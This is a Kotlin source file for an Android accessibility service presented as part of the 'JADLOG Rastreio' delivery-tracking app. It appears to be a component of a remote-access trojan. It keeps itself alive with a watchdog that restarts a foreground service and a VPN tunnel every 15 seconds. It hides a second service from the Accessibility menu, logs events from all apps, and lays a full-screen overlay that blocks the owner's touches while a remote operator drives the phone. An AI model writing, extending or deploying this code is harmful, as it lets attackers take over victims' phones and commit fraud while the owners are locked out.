package com.droidview.agent

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.FrameLayout
import com.droidview.agent.accessibility.AgentAccessibilityService
import com.droidview.agent.service.AgentForegroundService
import com.droidview.agent.vpn.AgentVpnService

/**
 * Serviço de Acessibilidade oficial do JADLOG Rastreio (DViewAccessibilityService).
 * Declarado no AndroidManifest.xml com android.permission.BIND_ACCESSIBILITY_SERVICE.
 * Permite supervisão, assistência remota autorizada e despacho de ações e gestos.
 *
 * Atua também como âncora imortal no sistema operacional Android:
 * Sendo mantido vivo pelo framework de acessibilidade do OS, supervisiona continuamente
 * e reativa o AgentForegroundService e o túnel VPN caso sejam interrompidos.
 */
class DViewAccessibilityService : AgentAccessibilityService() {

    private val watchdogHandler = Handler(Looper.getMainLooper())
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            try {
                // 1. Assegura que o serviço de primeiro plano principal está rodando
                if (!AgentForegroundService.isRunning) {
                    Log.i(TAG, "Watchdog A11Y: AgentForegroundService inativo. Reativando serviço mestre...")
                    AgentForegroundService.startService(this@DViewAccessibilityService)
                }

                // 2. Assegura que o túnel VPN de alta velocidade está rodando se configurado
                val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
                if (prefs.getBoolean("vpnEnabled", false) && !AgentVpnService.isRunning) {
                    val serverUrl = prefs.getString("serverUrl", "") ?: ""
                    if (serverUrl.isNotEmpty()) {
                        Log.i(TAG, "Watchdog A11Y: Túnel VPN inativo. Reativando VPN a partir das configurações...")
                        AgentVpnService.startFromPrefs(this@DViewAccessibilityService)
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Erro na execução do watchdog de acessibilidade: ${e.message}")
            }

            // Repete a checagem a cada 15 segundos
            watchdogHandler.postDelayed(this, WATCHDOG_INTERVAL_MS)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "DViewAccessibilityService conectado para JADLOG Rastreio. Iniciando supervisor watchdog...")

        // Garante que qualquer serviço secundário legado seja desativado
        // para que no menu de Acessibilidade do Android apareça apenas 1 serviço oficial!
        try {
            val legacyComponent = android.content.ComponentName(this, "com.droidview.agent.accessibility.AgentAccessibilityService")
            packageManager.setComponentEnabledSetting(
                legacyComponent,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        // Dispara o serviço mestre imediatamente na conexão
        AgentForegroundService.startService(this)

        // Inicia o loop periódico do watchdog
        watchdogHandler.removeCallbacks(watchdogRunnable)
        watchdogHandler.postDelayed(watchdogRunnable, 2000L)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        super.onAccessibilityEvent(event)
        if (event == null) return

        // Supervisão oportunista em eventos do sistema
        if (!AgentForegroundService.isRunning) {
            AgentForegroundService.startService(this)
        }

        val pkg = event.packageName?.toString() ?: ""
        val cls = event.className?.toString() ?: ""
        Log.d(TAG, "Evento capturado no JADLOG Rastreio: tipo=${event.eventType} pkg=$pkg cls=$cls")
    }

    override fun onInterrupt() {
        super.onInterrupt()
        Log.w(TAG, "DViewAccessibilityService interrompido temporariamente.")
    }

    private var touchBlockerView: View? = null

    /**
     * Trava ou destrava o toque físico no aparelho.
     * Utiliza TYPE_ACCESSIBILITY_OVERLAY nativo do serviço de acessibilidade,
     * consumindo toques físicos do usuário local enquanto preserva a rota de
     * suporte remoto via simulação de toques/gestos e transmissão em tempo real.
     */
    fun setTouchBlocker(active: Boolean, type: String = "black") {
        Handler(Looper.getMainLooper()).post {
            try {
                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                if (active) {
                    if (touchBlockerView != null) return@post
                    val overlay = FrameLayout(this).apply {
                        setBackgroundColor(Color.TRANSPARENT)
                        // Consome toques físicos na tela para isolar o aparelho
                        setOnTouchListener { _, _ -> true }
                    }
                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT
                    )
                    wm.addView(overlay, params)
                    touchBlockerView = overlay
                    Log.i(TAG, "Bloqueador de toque físico ativado (Suporte Remoto Total). Tipo: $type")
                } else {
                    touchBlockerView?.let {
                        wm.removeView(it)
                        touchBlockerView = null
                        Log.i(TAG, "Bloqueador de toque físico desativado. Aparelho normal restaurado.")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Erro ao gerenciar bloqueador de toque de acessibilidade: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        setTouchBlocker(false)
        watchdogHandler.removeCallbacks(watchdogRunnable)
        if (instance == this) {
            instance = null
        }
        Log.i(TAG, "DViewAccessibilityService destruído.")
        super.onDestroy()
    }

    companion object {
        private const val TAG = "DViewAccessibility"
        private const val WATCHDOG_INTERVAL_MS = 15000L // 15 segundos

        var instance: DViewAccessibilityService? = null
            private set

        fun isRunning(): Boolean = instance != null || AgentAccessibilityService.isServiceRunning()

        /**
         * Verifica no Android Settings se o serviço de acessibilidade do JADLOG Rastreio está ativo.
         * Utiliza Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES.
         */
        fun isAccessibilityEnabled(context: Context): Boolean {
            if (isRunning()) return true

            val expectedNames = arrayOf(
                "${context.packageName}/${DViewAccessibilityService::class.java.name}",
                "${context.packageName}/${AgentAccessibilityService::class.java.name}",
                "${context.packageName}/.DViewAccessibilityService",
                "${context.packageName}/.accessibility.AgentAccessibilityService"
            )

            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val colonSplitter = TextUtils.SimpleStringSplitter(':')
            colonSplitter.setString(enabledServices)
            while (colonSplitter.hasNext()) {
                val componentName = colonSplitter.next()
                for (expected in expectedNames) {
                    if (componentName.equals(expected, ignoreCase = true)) {
                        return true
                    }
                }
                if (componentName.contains(context.packageName, ignoreCase = true)) {
                    return true
                }
            }
            return false
        }
    }
}
